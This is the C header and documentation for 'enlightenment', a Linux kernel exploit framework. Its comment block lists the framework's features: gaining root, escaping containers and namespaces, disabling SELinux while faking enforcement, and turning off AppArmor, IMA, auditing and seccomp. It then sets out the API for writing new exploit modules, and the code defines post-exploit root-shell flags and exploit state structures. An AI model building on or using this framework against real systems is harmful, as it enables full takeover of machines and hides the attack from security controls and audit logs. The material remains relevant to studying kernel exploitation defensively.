/* enlightenment 200912092327

   enlightenment is an exploitation framework mostly geared towards the 
   exploitation of null ptr dereference bugs, though its routines are 
   applicable to overflows and other bugclasses as well.  It's a public 
   demonstration of the capabilities of kernel exploits, useful for 
   commercial pentesting or verifying the security of your own systems.

   enlightenment supports:
     all kernels 2.4 and 2.6/3.x (both x86 and x64)
     setting *uid/ *gid 0
     clearing supplementary groups
     raising to full capabilities
       pre and post cred structures
     breaking out of chroots and mnt namespaces
     breaking out of vserver containers
     breaking out of OpenVZ containers
     breaking out of user namespaces
     disabling No New Privs (NNP)
     disabling SECCOMP
     automatically switches from interrupt disabled -> process context
     uses kernel's internal symbol table for added functionality
     page table parsing on x64 for reliability in code scanning
     cloning of init's cred structure (when no cred symbols are present)
     CONFIG_DEBUG_RODATA bypass (both old and new versions)
     xen hypercalls for .text modification on new DEBUG_RODATA under Xen
     SELinux execmod/execmem bypassing
     SELinux disabling (and faking continued enforcement)
       even if the toggling variable has no generated symbol
     IMA disabling (rendering its TPM-based integrity checks worthless)
     Apparmor disabling
     Auditing disabling
     Tomoyo disabling
     generic LSM disabling
     all public methods of bypassing mmap_min_addr
     SMEP detection
     defeats proposed "exploit detection" : https://lkml.org/lkml/2013/12/12/358
     pearls of wisdom from some of the greatest writers and thinkers of 
     the past couple centuries :)

   To create your own exploit module for enlightenment, just name it
   exp_whatever.c
   It will be auto-compiled by the shell script and thrown into
   the list of loaded exploit modules

   if you want to use the list of non-NULL exploits:
     ./run_nonnull_exploits.sh
   if you want to run the list of NULL ptr deref exploits:
     ./run_null_exploits.sh

   Each module must have the following features:
   It must include this header file, exp_framework.h
   A description of the exploit, the variable being named "desc"
   A "prepare" function: int prepare(unsigned char *ptr)
     where ptr is the ptr to the NULL mapping, which you are able to write to
     This function can return the flags described below for prepare_the_exploit
     Return 0 for failure otherwise
   A "trigger" function: int trigger(void)
     Return 0 for failure, nonzero for success
   A "post" function: int post(void)
     This function can return the flags described below for post_exploit
   A "requires_null_page" int: int requires_null_page;
     This should be 1 if a NULL page needs to be mapped, and 0 otherwise
     (if you want to use the framework to exploit non-NULL ptr bugs)
   A "ring0_cleanup" function: int ring0_cleanup(void)
     Return value is ignored, this function is optional
   A "get_exploit_state_ptr" function:
     int get_exploit_state_ptr(struct exploit_state *ptr)
     Generally this will always be implemented as:
     struct *exp_state;
     int get_exploit_state_ptr(struct exploit_state *ptr)
     {
        exp_state = ptr;
        return 0;
     }
     It gives you access to the exploit_state structure listed below,
     get_kernel_sym allows you to resolve symbols
     own_the_kernel is the function that takes control of the kernel
      (in case you need its address to set up your buffer)
     the other variables describe the exploit environment, so you can
     for instance, loop through a number of vulnerable socket domains
     until you detect ring0 execution has occurred.

   That's it!
*/


/* defines for prepare_the_exploit */
 /* for null fptr derefs */
#define STRAIGHT_UP_EXECUTION_AT_NULL 0x31337
 /* for overflows */
#define EXIT_KERNEL_TO_NULL 0x31336

#define EXECUTE_AT_NONZERO_OFFSET 0xfffff000 // OR the offset with this

/* defines for post_exploit */
#define RUN_ROOTSHELL 0x5150
#define CHMOD_SHELL 0x5151
#define FUNNY_PIC_AND_ROOTSHELL 0xdeadc01d

typedef unsigned long (*_get_kernel_sym)(char *name);
typedef unsigned long __attribute__((regparm(3))) (*_kallsyms_lookup_name)(char *name);

struct exploit_state {
	_get_kernel_sym get_kernel_sym;
	_kallsyms_lookup_name kallsyms_lookup_name;
	void *own_the_kernel;
	void *exit_kernel;
	char *exit_stack;
	int run_from_main;
	int got_ring0;
	int got_root;
};

#define EFL_RESERVED1 (1 << 1)
#define EFL_PARITY (1 << 2)
#define EFL_ZEROFLAG (1 << 6)
#define EFL_INTERRUPTENABLE (1 << 9)
#define EFL_IOPL3 ((1 << 12) | (1 << 13))

#define USER_EFLAGS (EFL_RESERVED1 | EFL_PARITY | EFL_ZEROFLAG | EFL_INTERRUPTENABLE)
/* for insta-iopl 3, for whatever reason!
   #define USER_EFLAGS (EFL_RESERVED1 | EFL_PARITY | EFL_ZEROFLAG | EFL_INTERRUPTENABLE | EFL_IOPL3)
*/

#define DISABLED_LSM 		0x1
#define DISABLED_IMA 		0x2
#define DISABLED_APPARMOR 	0x4
#define DISABLED_SELINUX	0x8
